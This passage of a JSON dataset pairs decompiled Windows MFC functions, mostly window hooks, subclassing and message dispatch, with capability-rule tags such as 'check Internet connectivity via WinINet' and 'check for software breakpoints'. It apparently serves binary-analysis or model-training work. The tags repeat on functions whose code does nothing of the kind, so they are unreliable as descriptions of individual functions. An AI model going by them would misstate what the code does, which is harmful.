        "decompiled_code": "\nuint fcn.0042af59(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00432999(0x430b6e);\n    iVar2 = fcn.00431a51();\n    if ((*(iVar2 + 0x14) != '\\0') && (*(iVar1 + 0x28) != 0)) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar1 + 0x28));\n        *(iVar1 + 0x28) = 0;\n    }\n    if (*(iVar1 + 0x14) != 0) {\n        *(iVar1 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 170
    },
    "0042aff6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042aff6(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    iVar2 = fcn.0042852f();\n    if (iVar2 == 0) goto code_r0x0042b041;\n    if (*(iVar2 + 0x1c) == param_1) {\n        iVar3 = fcn.00431a51();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.00431a51();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.00430947();\n                if (iVar3 == 0) goto code_r0x0042b036;\n            }\n            fcn.00434b05(0);\n        }\ncode_r0x0042b036:\n        *(iVar2 + 0x1c) = 0;\n    }\n    if (*(iVar2 + 0x20) == param_1) {\n        *(iVar2 + 0x20) = 0;\n    }\ncode_r0x0042b041:\n    if (param_1[0x11] != NULL) {\n        (**(*param_1[0x11] + 0x50))();\n        param_1[0x11] = 0;\n    }\n    if (param_1[0x12] != NULL) {\n        (**(*param_1[0x12] + 4))(1);\n    }\n    param_1[0x12] = 0;\n    if ((*(param_1 + 0xe) & 1) != 0) {\n        iVar2 = fcn.00431a77();\n        iVar2 = *(iVar2 + 0x3c);\n        if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n            fcn.0041cc60(&var_30h, 0, 0x30);\n            var_28h = param_1[7];\n            var_30h = 0x28;\n            var_2ch = 1;\n            var_24h = var_28h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_30h);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[7], 0xfffffffc);\n    fcn.0042ae0e();\n    iVar3 = (*pcVar1)(param_1[7], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0xf0))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[7], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.0042af2b();\n    (**(*param_1 + 0x114))();\n    return;\n}\n",
        "token_count": 742
    },
    "0042b314": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042b314(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 8) != '\\0') {\n        var_4h = NULL;\n        iVar1 = (**(*in_ECX + 0xe4))(arg_8h, arg_ch, &var_4h);\n        if (-1 < iVar1) {\n            return var_4h;\n        }\n    }\n    piVar2 = fcn.0042ae0e();\n    return piVar2;\n}\n",
        "token_count": 164
    },
    "0042b476": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nuint fcn.0042b476(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_18h;\n    uint var_10h;\n    uint var_40h;\n    uint var_24h;\n    uint var_14h_2;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    iVar1 = fcn.00432999(0x430b6e);\n    puVar4 = iVar1 + 0x58;\n    puVar5 = unaff_EBP + -0x40;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h = *(unaff_EBP + 8);\n    *(iVar1 + 0x58) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x60) = *(unaff_EBP + 0x14);\n    *(iVar1 + 100) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(iVar1 + 0x5c) = iVar3;\n    *(unaff_EBP + -4) = 0;\n    if ((iVar3 == 2) && (arg_8h[0x12] != 0)) {\n        (**(*arg_8h[0x12] + 0x60))(0);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.0042a51f(arg_8h, unaff_EBP + -0x24, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h + 0x108))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.0042b3fd(arg_8h, unaff_EBP + -0x24);\n    }\n    uVar2 = *(unaff_EBP + 0x18);\n    puVar4 = unaff_EBP + -0x40;\n    puVar5 = iVar1 + 0x58;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 777
    },
    "0042b5ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042b5ae(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[7] != NULL) && (extraout_ECX != 0x4490a8)) && (extraout_ECX != 0x4490f8)) &&\n       ((extraout_ECX != 0x449148 && (extraout_ECX != 0x449198)))) {\n        fcn.0042b107();\n    }\n    if (extraout_ECX[0x12] != NULL) {\n        (**(*extraout_ECX[0x12] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0x13];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x24) == extraout_ECX)) {\n        *(pcVar1 + 0x24) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00428b21();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 355
    },
    "0042b70c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042b70c(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[7] != 0)) {\n        iVar2 = (**(*param_1 + 0x120))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.0042b6cd();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.0042b6cd();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 189
    },
    "0042b74d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b74d(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.0042aed8(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0042b476(iVar2, *(iVar2 + 0x1c), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0042b74d(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 332
    },
    "0042b8d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042b8d0(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0042aef2(param_2);\n    if (iVar1 != 0) {\n        (**(*param_1 + 0x50))();\n        piVar2 = (**(*param_1 + 0xf0))();\n        iVar1 = (*_sym.imp.USER32.dll_SetWindowLongA)(unaff_retaddr, 0xfffffffc, fcn.0042b563);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar1;\n        }\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 181
    },
    "0042bc75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042bc75(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    if (arg_8h != NULL) {\n        do {\n            iVar1 = *arg_8h;\n            if (iVar1 == 0) break;\n            iVar3 = arg_8h[1];\n            var_8h = *(arg_8h + 2);\n            puVar5 = arg_8h + 4;\n            if (iVar3 == 0x1234) {\ncode_r0x0042bcdc:\n                (**0x4430a0)();\n                var_28h = 0xffffffff;\n                var_2ch = 1;\n                iVar3 = 0x401;\n                puVar6 = &var_2ch;\n                var_24h = puVar5;\ncode_r0x0042bd17:\n                iVar4 = (*pcVar2)(*(in_ECX + 0x1c), iVar1, iVar3, 0, puVar6);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n            }\n            else {\n                puVar6 = puVar5;\n                if (iVar3 == 0x401) {\n                    iVar3 = 0x180;\n                    goto code_r0x0042bd17;\n                }\n                if (iVar3 == 0x403) {\n                    iVar3 = 0x143;\n                }\n                if (iVar3 == 0x401) goto code_r0x0042bcdc;\n                if ((iVar3 == 0x180) || (iVar3 == 0x143)) goto code_r0x0042bd17;\n            }\n            arg_8h = puVar5 + var_8h;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.0042b74d(*(in_ECX + 0x1c), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 574
    },
    "0042bf85": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bf85(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint var_13ch;\n    uint var_10ch;\n    uchar var_dh;\n    uint32_t var_ch;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    iVar4 = fcn.00432999(0x430b6e);\n    if (arg_8h != 3) {\n        (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), arg_8h, arg_ch, arg_10h);\n        goto code_r0x0042c197;\n    }\n    piVar2 = *(iVar4 + 0x14);\n    iVar8 = *arg_10h;\n    iVar5 = fcn.00431a51();\n    cVar1 = *(iVar5 + 0x14);\n    if ((piVar2 != NULL) || (((*(iVar8 + 0x23) & 0x40) == 0 && (cVar1 == '\\0')))) {\n        if (*0x4495b8 == 0) {\ncode_r0x0042c048:\n            if (piVar2 == NULL) {\n                if (*0x4491e8 == 0) {\n                    fcn.0041cc60(&var_13ch, 0, 0x30);\n                    var_13ch = 0x30;\n                    *0x4491e8 = (*_sym.imp.USER32.dll_GetClassInfoExA)(0, \"#32768\", &var_13ch);\n                    if (*0x4491e8 != 0) goto code_r0x0042c0ce;\n                    iVar8 = (*_sym.imp.USER32.dll_GetClassNameA)(arg_ch, &var_10ch, 0x100);\n                    if (iVar8 != 0) {\n                        var_dh = 0;\n                        iVar8 = fcn.0041b056(&var_10ch, \"#32768\");\n                        if (iVar8 == 0) goto code_r0x0042c16d;\n                    }\n                }\n                else {\ncode_r0x0042c0ce:\n                    iVar3 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe0);\n                    if (iVar3 == *0x4491e8) goto code_r0x0042c16d;\n                }\n                var_ch = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n                pcVar10 = _sym.imp.USER32.dll_GetPropA;\n                if ((var_ch != 0) && (iVar8 = (*_sym.imp.USER32.dll_GetPropA)(arg_ch, \"AfxOldWndProc423\"),  iVar8 == 0))\n                {\n                    (*_sym.imp.USER32.dll_SetPropA)(arg_ch, \"AfxOldWndProc423\", var_ch);\n                    uVar6 = (*pcVar10)(arg_ch, \"AfxOldWndProc423\");\n                    if (uVar6 == var_ch) {\n                        (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(\"AfxOldWndProc423\");\n                        (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, 0x42be2d);\n                    }\n                }\n            }\n            else {\n                fcn.0042aef2(arg_ch);\n                (**(*piVar2 + 0x50))();\n                ppcVar9 = (**(*piVar2 + 0xf0))();\n                pcVar10 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, fcn.0042b563);\n                if (pcVar10 != fcn.0042b563) {\n                    *ppcVar9 = pcVar10;\n                }\n                *(iVar4 + 0x14) = 0;\n            }\n        }\n        else {\n            uVar6 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe6);\n            if ((uVar6 & 0x10000) == 0) {\n                puVar7 = *(iVar8 + 0x28);\n                if (puVar7 < 0x10000) {\n                    var_ch = var_ch & 0xffffff00;\n                    (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(*(iVar8 + 0x28), &var_ch, 5);\n                    puVar7 = &var_ch;\n                }\n                iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(puVar7, 0x4396e4);\n                if (iVar8 != 0) goto code_r0x0042c048;\n            }\n        }\n    }\ncode_r0x0042c16d:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), 3, arg_ch, arg_10h);\n    if (cVar1 != '\\0') {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar4 + 0x28));\n        *(iVar4 + 0x28) = 0;\n    }\ncode_r0x0042c197:\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 1239
    },
    "0042c1a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0042c1a4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.00432999(0x430b6e);\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x28) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, fcn.0042bf85, 0, uVar2);\n            *(iVar1 + 0x28) = iVar3;\n            if (iVar3 == 0) {\n                fcn.00427582();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "0042c329": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_74h\n\nuint __cdecl fcn.0042c329(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t *arg_8h_00;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t unaff_EBP;\n    int16_t iVar11;\n    uint *in_FS_OFFSET;\n    int32_t *in_stack_ffffff70;\n    uint in_stack_ffffff84;\n    uint var_74h;\n    uint var_58h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = 0;\n    uVar7 = *(unaff_EBP + 8);\n    if (uVar7 == 0x111) {\n        iVar4 = (**(*arg_8h_00 + 0xe8))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar4 == 0) goto code_r0x0042c514;\ncode_r0x0042c7c4:\n        *(unaff_EBP + -0x10) = 1;\n        goto code_r0x0042c81c;\n    }\n    if (uVar7 == 0x4e) {\n        if (**(unaff_EBP + 0x10) == 0) goto code_r0x0042c514;\n        iVar4 = (**(*arg_8h_00 + 0xec))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\ncode_r0x0042c7e8:\n        if (iVar4 == 0) goto code_r0x0042c514;\n        goto code_r0x0042c81c;\n    }\n    puVar9 = *(unaff_EBP + 0x10);\n    if (uVar7 == 6) {\n        in_stack_ffffff84 = fcn.0042aeb1(puVar9);\n        fcn.0042bd56(arg_8h_00, *(unaff_EBP + 0xc), in_stack_ffffff84);\n    }\n    iVar11 = puVar9;\n    if ((uVar7 == 0x20) &&\n       (in_stack_ffffff70 = arg_8h_00,  iVar4 = fcn.0042bdb7(arg_8h_00, iVar11, puVar9 >> 0x10),  iVar4 != 0))\n    goto code_r0x0042c7c4;\n    if (((arg_8h_00[0x12] != 0) && (0 < *(arg_8h_00[0x12] + 0x70))) &&\n       ((((0x1ff < uVar7 && (uVar7 < 0x20a)) || ((0xff < uVar7 && (uVar7 < 0x110)))) ||\n        ((0x280 < uVar7 && (uVar7 < 0x292)))))) {\n        in_stack_ffffff70 = *(unaff_EBP + 0xc);\n        iVar4 = (**(*arg_8h_00[0x12] + 0x94))(uVar7, in_stack_ffffff70, puVar9, unaff_EBP + -0x10);\n        if (iVar4 == 0) goto code_r0x0042c41b;\n        goto code_r0x0042c81c;\n    }\ncode_r0x0042c41b:\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    *(unaff_EBP + -0x14) = uVar5;\n    uVar7 = *(unaff_EBP + 8);\n    fcn.00432c08(7);\n    iVar4 = ((uVar5 ^ uVar7) & 0x1ff) * 0xc;\n    iVar6 = *(unaff_EBP + -0x14);\n    if ((*(unaff_EBP + 8) != *(iVar4 + 0x447878)) || (iVar6 != *(iVar4 + 0x447880))) {\n        *(iVar4 + 0x447878) = *(unaff_EBP + 8);\n        *(iVar4 + 0x447880) = iVar6;\n        while (iVar6 != 0) {\n            if (*(unaff_EBP + 8) < 0xc000) {\n                iVar6 = fcn.00429c9d(*(*(unaff_EBP + -0x14) + 4), *(unaff_EBP + 8), in_stack_ffffff70, 0);\n                *(unaff_EBP + 0x10) = iVar6;\n                if (iVar6 != 0) {\n                    *(iVar4 + 0x44787c) = iVar6;\n                    fcn.00432c6b(7);\n                    goto code_r0x0042c4ac;\n                }\n            }\n            else {\n                iVar6 = *(*(unaff_EBP + -0x14) + 4);\n                while( true ) {\n                    iVar6 = fcn.00429c9d(iVar6, 0xc000, 0, in_stack_ffffff84);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 == 0) break;\n                    if (**(*(unaff_EBP + 0x10) + 0x10) == *(unaff_EBP + 8)) {\n                        *(iVar4 + 0x44787c) = *(unaff_EBP + 0x10);\n                        fcn.00432c6b(7);\n                        goto code_r0x0042c80b;\n                    }\n                    iVar6 = *(unaff_EBP + 0x10) + 0x18;\n                }\n            }\n            iVar6 = **(unaff_EBP + -0x14);\n            *(unaff_EBP + -0x14) = iVar6;\n        }\n        *(iVar4 + 0x44787c) = 0;\n        fcn.00432c6b(7);\ncode_r0x0042c514:\n        uVar8 = 0;\n        goto code_r0x0042c516;\n    }\n    iVar4 = *(iVar4 + 0x44787c);\n    *(unaff_EBP + 0x10) = iVar4;\n    fcn.00432c6b(7);\n    if (iVar4 == 0) goto code_r0x0042c514;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x0042c80b:\n        uVar8 = (**(*(unaff_EBP + 0x10) + 0x14))(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042c819;\n    }\ncode_r0x0042c4ac:\n    pcVar1 = *(*(unaff_EBP + 0x10) + 0x14);\n    iVar4 = *(*(unaff_EBP + 0x10) + 0x10);\n    iVar3 = puVar9 >> 0x10;\n    // switch table (65 cases) at 0x42c830\n    switch(iVar4) {\n    case 1:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0042f111(puVar9);\n        goto code_r0x0042c635;\n    case 2:\n    case 3:\n    case 4:\n    case 0x18:\n    case 0x19:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c635;\n    case 5:\n    case 0xc:\n        uVar5 = puVar9 >> 0x10;\n        puVar9 = puVar9 & 0xffff;\n        uVar7 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0042aeb1(uVar7, puVar9, uVar5);\n        goto code_r0x0042c659;\n    case 6:\n        uVar7 = fcn.0042aeb1(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042c76e;\n    case 7:\n    case 0xd:\ncode_r0x0042c635:\n        uVar8 = (*pcVar1)(puVar9);\n        goto code_r0x0042c819;\n    case 8:\n        fcn.0042ed87();\n        uVar8 = puVar9[1];\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x20) = uVar8;\n        fcn.0042a4dc();\n        uVar8 = *puVar9;\n        uVar2 = puVar9[2];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x58) = uVar8;\n        iVar4 = fcn.0042aed8(uVar8);\n        if (iVar4 == 0) {\n            if ((arg_8h_00[0x12] != 0) && (iVar4 = fcn.00427f64(*(unaff_EBP + -0x58)),  iVar4 != 0)) {\n                *(unaff_EBP + -0x28) = iVar4;\n            }\n            iVar4 = unaff_EBP + -0x74;\n        }\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, iVar4, uVar2);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\n        *(unaff_EBP + -4) = 0;\n        fcn.0042b5ae();\n        goto code_r0x0042c604;\n    case 9:\n        fcn.0042ed87();\n        uVar8 = puVar9[2];\n        *(unaff_EBP + -0x20) = puVar9[1];\n        *(unaff_EBP + -4) = 2;\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, uVar8);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\ncode_r0x0042c604:\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0042f187();\n        break;\n    case 10:\n        uVar7 = fcn.0042aeb1(puVar9, *(unaff_EBP + 0xc) >> 0x10);\n        goto code_r0x0042c654;\n    case 0xb:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c76e;\n    case 0xe:\n    case 0x2c:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c76e;\n    case 0xf:\n        puVar9 = fcn.0042e4a0(puVar9);\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0042c654:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0042c659:\n        uVar8 = (*pcVar1)(uVar5, uVar7, puVar9);\n        goto code_r0x0042c819;\n    case 0x10:\n        (*pcVar1)();\n        break;\n    case 0x11:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c78e;\n    case 0x12:\n    case 0x1b:\n    case 0x2a:\n    case 0x2f:\n        goto code_r0x0042c781;\n    case 0x13:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c784;\n    case 0x14:\n        puVar9 = iVar3;\n        uVar7 = iVar11;\n        goto code_r0x0042c784;\n    case 0x15:\n    case 0x16:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x0042c7b2;\n    case 0x17:\n        fcn.0042aeb1(puVar9);\ncode_r0x0042c781:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c784;\n    case 0x1a:\n    case 0x25:\n    case 0x2e:\n        uVar8 = (*pcVar1)();\n        goto code_r0x0042c819;\n    case 0x1c:\n        puVar10 = *(unaff_EBP + 0xc);\n        uVar7 = fcn.0042aeb1(puVar10);\n        fcn.0042aeb1(puVar9, uVar7);\n        uVar5 = arg_8h_00[7] == puVar9;\n        goto code_r0x0042c7b6;\n    case 0x1d:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0042f111(puVar9);\n        goto code_r0x0042c78e;\n    case 0x1e:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0042e4a0(puVar9);\n        goto code_r0x0042c78e;\n    case 0x1f:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        uVar5 = fcn.0042e4a0(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x0042c7b6;\n    case 0x20:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c6f1;\n    case 0x21:\ncode_r0x0042c6f1:\n        fcn.0042aeb1(puVar9);\n        goto code_r0x0042c78e;\n    case 0x22:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x0042c70d;\n    case 0x23:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x0042c70d:\n        uVar5 = fcn.0042aeb1(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x0042c7b6;\n    case 0x24:\n        uVar7 = fcn.0042aeb1(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042c784;\n    case 0x26:\n        puVar10 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = fcn.0042aeb1(puVar9, puVar10);\n        goto code_r0x0042c79e;\n    case 0x27:\n    case 0x28:\n        *(unaff_EBP + 8) = *(unaff_EBP + 0xc);\n        *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) >> 0x10;\n        if (iVar4 == 0x27) {\n            